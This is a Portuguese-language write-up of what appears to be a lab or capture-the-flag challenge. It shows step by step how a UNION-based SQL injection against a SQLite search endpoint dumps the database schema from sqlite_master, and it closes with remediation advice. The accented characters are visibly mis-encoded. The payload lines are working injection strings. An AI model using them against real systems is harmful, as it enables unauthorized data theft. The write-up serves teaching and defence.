Esse desafio mostra um **ataque de SQL Injection (SQLi)** voltado para **exfiltrar o esquema completo do banco de dados (DB Schema)**, explorando a tabela especial **`sqlite_master`** do SQLite.

---

### üîç **Como funciona o ataque?**

1. A aplica√ß√£o usa **SQLite** e tem uma vulnerabilidade de SQL Injection no par√¢metro **`q`** da rota `/rest/products/search`.

2. O atacante envia **payloads SQL** at√© encontrar uma forma de unir (`UNION SELECT`) os resultados da tabela normal de produtos com os dados de **`sqlite_master`**, que cont√©m o **DDL (CREATE TABLE / CREATE INDEX)** de todas as tabelas.

3. A tabela **`sqlite_master`** tem uma coluna chamada **`sql`**, que guarda o comando SQL usado para criar cada tabela/√≠ndice.

---

### üîë **Etapas do ataque explicado**

#### ‚úÖ **1) Confirmar a inje√ß√£o**

O atacante envia:

```
'))--
```

‚û°Ô∏è Isso fecha a query e comenta o restante, confirmando que h√° **SQL Injection**.

---

#### ‚úÖ **2) Testar UNION SELECT**

Envia:

```
')) UNION SELECT * FROM sqlite_master--
```

‚û°Ô∏è O erro **"no such table: x"** confirma que `sqlite_master` existe.

---

#### ‚úÖ **3) Descobrir o n√∫mero de colunas da query original**

Ele tenta v√°rias combina√ß√µes:

```
')) UNION SELECT '1' FROM sqlite_master--   ‚ùå Erro: poucas colunas
')) UNION SELECT '1','2' FROM sqlite_master-- ‚ùå Erro
')) UNION SELECT '1','2','3',...,'9' FROM sqlite_master-- ‚úÖ Finalmente funciona
```

Ou seja, a query original retorna **9 colunas**, ent√£o o UNION precisa ter **9 valores**.

---

#### ‚úÖ **4) Extrair o schema**

Agora, troca o **primeiro valor** pelo campo **`sql`** (que cont√©m o CREATE TABLE):

```
')) UNION SELECT sql,'2','3','4','5','6','7','8','9' FROM sqlite_master--
```

A resposta JSON retorna objetos como:

```json
{
  "id": "CREATE TABLE Users(id INTEGER PRIMARY KEY, ... )",
  "name": "2",
  "description": "3",
  ...
}
```

Ou seja, o atacante consegue **baixar a defini√ß√£o de todas as tabelas**.

---

### üî• **Por que isso √© perigoso?**

* Com o **schema completo**, o invasor descobre **nomes de tabelas, colunas, tipos de dados e relacionamentos**.
* Isso facilita ataques futuros como:
  ‚úÖ Roubo de dados com SELECTs espec√≠ficos
  ‚úÖ Escalada para **SQLi avan√ßado** (INSERT/UPDATE/DELETE)
  ‚úÖ Quebra de autentica√ß√£o (sabendo onde ficam senhas e tokens)

---

### üìå **Qual √© a vulnerabilidade?**

‚úÖ **SQL Injection (SQLi)** ‚Üí A aplica√ß√£o **n√£o faz valida√ß√£o/escape do par√¢metro `q`**, permitindo injetar comandos SQL arbitr√°rios.

---

### üîê **Como corrigir?**

1. Usar **queries parametrizadas (prepared statements)** em vez de concatenar strings SQL.
2. Validar a entrada do usu√°rio (whitelist, filtros).
3. Nunca exibir mensagens de erro detalhadas do banco para o usu√°rio.
